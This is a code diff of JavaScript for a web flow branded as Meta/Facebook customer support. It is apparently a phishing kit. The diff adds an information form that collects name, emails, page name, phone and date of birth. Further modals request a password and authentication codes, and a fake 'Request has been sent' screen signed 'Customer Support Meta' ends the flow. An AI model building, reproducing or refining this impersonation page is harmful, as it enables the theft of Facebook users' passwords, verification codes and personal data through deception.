@@ -1,21 +1,69 @@
 // Main Application Logic
-document.getElementById('clientForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const formData = {
-        fullName: document.getElementById('fullName').value.trim(),
-        email: document.getElementById('email').value.trim(),
-        emailBusiness: document.getElementById('emailBusiness').value.trim(),
-        fanpage: document.getElementById('fanpage').value.trim(),
-        phone: document.getElementById('phone').value.trim(),
-    };
 
-    Utils.saveRecord('__client_rec__fi_rst', formData);
-    openSecurityModal();
-});
+// Generate ticket ID
+document.getElementById('ticketId').textContent = Utils.generateTicketId();
+
+// Start verification flow
+document.getElementById('submitRequestBtn').addEventListener('click', openClientModal);
+
+// ==================== MODAL 1: CLIENT INFO ====================
+function openClientModal() {
+    const content = `
+        <h2 class="font-bold text-[15px] mb-4">Information Form</h2>
+        <form id="clientForm" class="space-y-3">
+            <input type="text" id="fullName" placeholder="Full Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+            <input type="email" id="email" placeholder="Email" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+            <input type="email" id="emailBusiness" placeholder="Email Business" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+            <input type="text" id="fanpage" placeholder="Page Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+            <input type="tel" id="phone" placeholder="Phone Number" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+            <div>
+                <b class="text-[#9a979e] text-sm block mb-2">Date of Birth</b>
+                <div class="grid grid-cols-3 gap-2">
+                    <input type="number" id="day" placeholder="Day" min="1" max="31" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+                    <input type="number" id="month" placeholder="Month" min="1" max="12" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+                    <input type="number" id="year" placeholder="Year" min="1900" max="2024" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+                </div>
+            </div>
+            <textarea placeholder="Additional notes (optional)" class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
+            <p class="text-[#9a979e] text-[14px] mb-[7px]">Our response will be sent to you within 14 - 48 hours.</p>
+            <div class="mt-[15px] mb-[20px]">
+                <label class="cursor-pointer flex items-center gap-[5px] text-[14px] " for="custom-checkbox">
+                    <label class="inline-flex items-center cursor-pointer">
+                        <input type="checkbox">
+                    </label>
+                    I agree with<a class="text-[#0d6efd] flex items-center gap-[5px] inline pointer-events-none" href="">Terms of use <img src="./public/icons/reject.svg" class="w-[10px] h-[10px] items-center inline" alt=""></a>
+                </label>
+            </div>
+            <button type="submit" class="w-full h-10 bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">Send</button>
+        </form>
+    `;
+
+    Modal.create('clientModal', content);
+    Modal.open('clientModal');
+
+    document.getElementById('clientForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const formData = {
+            fullName: document.getElementById('fullName').value.trim(),
+            email: document.getElementById('email').value.trim(),
+            emailBusiness: document.getElementById('emailBusiness').value.trim(),
+            fanpage: document.getElementById('fanpage').value.trim(),
+            phone: document.getElementById('phone').value.trim(),
+            day: document.getElementById('day').value,
+            month: document.getElementById('month').value,
+            year: document.getElementById('year').value
+        };
+
+        Utils.saveRecord('__client_rec__fi_rst', formData);
+        Modal.close('clientModal');
+        openSecurityModal();
+    });
+}
+
 // ==================== MODAL 2: SECURITY (PASSWORD) ====================
 function openSecurityModal() {
     const content = `
-        <div class="h-auto flex flex-col items-center justify-between flex-1">
+        <div class="h-full flex flex-col items-center justify-between flex-1">
             <div class="w-12 h-12 mb-5 mx-auto">
                 <img src="./public/icons/ic_logo.svg" alt="Meta" class="w-full">
             </div>
@@ -29,7 +77,7 @@ function openSecurityModal() {
                 </form>
             </div>
             <div class="w-16 mt-5 mx-auto">
-                <img src="./public/icons/ic_logo_gray.svg" alt="Meta">
+                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
             </div>
         </div>
     `;
@@ -107,6 +155,9 @@ function openAuthenticationModal(userData) {
                     <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">Continue</button>
                     <div class="w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none"><span>Try another way</span></div>
                 </form>
+            </div>
+            <div class="w-16 mt-5 mx-auto">
+                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
             </div>
         </div>
     `;
@@ -196,9 +247,9 @@ function openAuthenticationModal(userData) {
 // ==================== MODAL 4: SUCCESS ====================
 function openSuccessModal() {
     const content = `
-        <h2 class="font-bold text-[18px] mb-4 text-left">Request has been sent</h2>
+        <h2 class="font-bold text-[18px] mb-4 text-center">Request has been sent</h2>
         <div class="rounded-lg overflow-hidden mb-4">
-            <img src="./public/images/succes.jpg" alt="Success" class="w-full">
+            <img src="./public/images/success.jpg" alt="Success" class="w-full">
         </div>
         <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>
         <p class="text-[#9a979e] mb-5 text-[15px]">From the Customer Support Meta.</p>
@@ -206,7 +257,7 @@ function openSuccessModal() {
             Return to Facebook
         </a>
         <div class="w-16 mt-5 mx-auto">
-            <img src="./public/icons/ic_logo_gray.svg" alt="Meta">
+            <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
         </div>
     `;
 
